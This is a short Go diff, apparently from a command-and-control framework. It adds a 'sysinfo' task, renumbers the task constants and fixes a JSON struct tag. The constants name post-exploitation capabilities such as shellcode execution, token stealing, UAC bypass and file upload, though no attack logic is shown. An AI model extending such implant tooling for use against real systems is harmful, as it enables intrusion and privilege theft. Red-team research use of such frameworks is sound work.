@@ -48,13 +48,14 @@ const (
 	TASK_SCREENSHOT   = 0x38
 	TASK_SHELLCODE    = 0x39
 	TASK_SLEEP        = 0x40
-	TASK_TOKEN_REVERT = 0x41
-	TASK_TOKEN_STEAL  = 0x42
-	TASK_UAC          = 0x43
-	TASK_UPLOAD       = 0x44
-	TASK_USER_LS      = 0x45
-	TASK_WHOAMI       = 0x46
-	TASK_WHOAMI_PRIV  = 0x47
+	TASK_SYSINFO      = 0x41
+	TASK_TOKEN_REVERT = 0x42
+	TASK_TOKEN_STEAL  = 0x43
+	TASK_UAC          = 0x44
+	TASK_UPLOAD       = 0x45
+	TASK_USER_LS      = 0x46
+	TASK_WHOAMI       = 0x47
+	TASK_WHOAMI_PRIV  = 0x48
 )
 
 func GetTaskCode(task string) (int, error) {
@@ -139,6 +140,8 @@ func GetTaskCode(task string) (int, error) {
 		return TASK_SHELLCODE, nil
 	case "sleep":
 		return TASK_SLEEP, nil
+	case "sysinfo":
+		return TASK_SYSINFO, nil
 	case "token revert":
 		return TASK_TOKEN_REVERT, nil
 	case "token steal":
@@ -214,5 +217,5 @@ func FormatTaskFromJsonStr(taskJSONStr string) (string, error) {
 
 type TaskResult struct {
 	Task   Task   `json:"task"`
-	Result string `json:result`
+	Result string `json:"result"`
 }
